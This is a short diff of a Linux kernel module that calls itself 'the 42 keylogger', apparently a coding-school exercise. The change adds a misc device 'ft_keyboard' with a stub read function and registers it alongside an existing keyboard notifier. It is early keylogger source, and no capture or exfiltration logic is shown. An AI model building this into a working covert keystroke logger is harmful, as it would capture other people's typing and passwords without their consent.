@@ -16,6 +16,22 @@
 
 extern const struct s_key keys_table[];
 
+static ssize_t	my_read(struct file *file, char __user *out, size_t len, loff_t *off)
+{
+	return 0;
+}
+
+static const struct file_operations fops = {
+	.owner = THIS_MODULE,
+	.read = my_read,
+};
+
+static const struct miscdevice device = {
+	.minor = MISC_DYNAMIC_MINOR,
+	.name = "ft_keyboard",
+	.fops = &fops,
+};
+
 static int	keyboard_event(struct notifier_block *nb, unsigned long action, void *data)
 {
 	struct keyboard_notifier_param	*param = data;
@@ -45,11 +61,13 @@ static int __init dni_init(void)
 {
 	pr_info("hi from the 42 keylogger\n");
 	register_keyboard_notifier(&keyboard_nb);
+	misc_register(&device);
 	return 0;
 }
 
 static void __exit dni_exit(void)
 {
+	misc_deregister(&device);
 	unregister_keyboard_notifier(&keyboard_nb);
 	pr_info("by from the 42 keylogger\n");
 }
